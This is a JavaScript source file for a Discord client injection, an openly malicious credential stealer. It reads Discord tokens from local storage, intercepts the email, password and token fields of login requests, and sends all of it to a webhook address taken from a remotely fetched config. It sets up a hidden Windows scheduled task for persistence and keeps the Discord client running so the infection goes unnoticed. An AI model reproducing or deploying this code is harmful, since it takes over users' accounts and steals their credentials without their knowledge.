// Discord Injection - Minimal Working Version
// Fetches config from GitHub and exfiltrates data

const { session } = require('electron');
const https = require('https');
const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');

const CONFIG_URL = '%%CONFIG_URL%%';

let webhook = '';
let updateUrl = '';
let configLoaded = false;

// Fetch config from GitHub
function loadConfig() {
    https.get(CONFIG_URL, (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => {
            try {
                const config = JSON.parse(data);
                webhook = config.webhook;
                updateUrl = config.update_url;
                configLoaded = true;
                console.log('[Injection] Config loaded');
                stealToken();
            } catch (e) {
                console.error('[Injection] Config parse error:', e);
            }
        });
    }).on('error', (e) => {
        console.error('[Injection] Config fetch error:', e);
    });
}

// Send data to webhook
function sendWebhook(data) {
    if (!webhook || !configLoaded) return;
    
    const payload = JSON.stringify({
        embeds: [{
            title: 'Discord Token Captured',
            description: `\`\`\`${data}\`\`\``,
            color: 0xff0000,
            timestamp: new Date().toISOString()
        }]
    });
    
    const url = new URL(webhook);
    const options = {
        hostname: url.hostname,
        path: url.pathname + url.search,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': payload.length
        }
    };
    
    const req = https.request(options);
    req.write(payload);
    req.end();
}

// Steal Discord token
function stealToken() {
    try {
        const discordPath = path.join(require('os').homedir(), 'AppData', 'Roaming', 'discord', 'Local Storage', 'leveldb');
        
        if (fs.existsSync(discordPath)) {
            const files = fs.readdirSync(discordPath);
            for (const file of files) {
                if (file.endsWith('.ldb') || file.endsWith('.log')) {
                    const content = fs.readFileSync(path.join(discordPath, file), 'utf-8');
                    const tokens = content.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27,}/g) || [];
                    
                    for (const token of tokens) {
                        sendWebhook(`Token: ${token}`);
                    }
                }
            }
        }
    } catch (e) {
        console.error('[Injection] Token steal error:', e);
    }
}

// Hook session to capture credentials
if (session && session.defaultSession) {
    const original = session.defaultSession.webRequest.onBeforeRequest;
    session.defaultSession.webRequest.onBeforeRequest((details, callback) => {
        if (details.url.includes('/api/v') && details.uploadData) {
            try {
                const data = Buffer.from(details.uploadData[0].bytes).toString();
                const json = JSON.parse(data);
                
                if (json.email || json.password || json.token) {
                    sendWebhook(`Login: ${JSON.stringify(json, null, 2)}`);
                }
            } catch (e) {}
        }
        
        callback({});
    });
}

// Create persistence via Task Scheduler
function createPersistence() {
    try {
        const exePath = path.join(require('os').tmpdir(), 'discord_module_cache.exe');
        
        if (fs.existsSync(exePath)) {
            const taskXml = `<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <TimeTrigger>
      <Repetition>
        <Interval>PT15M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Actions>
    <Exec>
      <Command>${exePath.replace(/\\/g, '\\\\')}</Command>
    </Exec>
  </Actions>
  <Settings>
    <Hidden>true</Hidden>
  </Settings>
</Task>`;
            
            const xmlPath = path.join(require('os').tmpdir(), 'discord_task.xml');
            fs.writeFileSync(xmlPath, taskXml);
            
            exec(`schtasks /create /tn "Discord Module Cache" /xml "${xmlPath}" /f`, (err) => {
                if (!err) {
                    console.log('[Injection] Persistence created');
                    try { fs.unlinkSync(xmlPath); } catch {}
                }
            });
        }
    } catch (e) {
        console.error('[Injection] Persistence error:', e);
    }
}

// Initialize
loadConfig();
setTimeout(createPersistence, 5000);

// Keep Discord running normally
module.exports = require('./core.asar');
